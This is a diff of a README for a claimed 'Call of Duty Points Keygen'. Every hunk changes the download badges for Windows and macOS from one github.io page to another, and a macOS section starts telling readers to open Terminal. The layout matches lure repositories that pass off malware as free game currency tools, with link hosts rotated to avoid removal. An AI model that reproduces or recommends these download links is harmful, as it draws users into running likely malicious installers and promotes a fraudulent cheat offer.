@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Call+of+Duty+Points_Keygen-FF8C00?style=for-the-badge&logo=activision)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_Call+of+Duty+Points_Keygen-FF8C00?style=for-the-badge&logo=activision)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Call+of+Duty+Points_Keygen-FF8C00?style=for-the-badge&logo=activision)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_Call+of+Duty+Points_Keygen-FF8C00?style=for-the-badge&logo=activision)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
@@ -105,7 +105,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → Terminal → Enter)
@@ -128,7 +128,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Call+of+Duty+Points_Keygen-FF8C00?style=for-the-badge&logo=activision)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_Call+of+Duty+Points_Keygen-FF8C00?style=for-the-badge&logo=activision)](https://WatchMizukageSnap.github.io/getwindows/)
 
 </div>
 
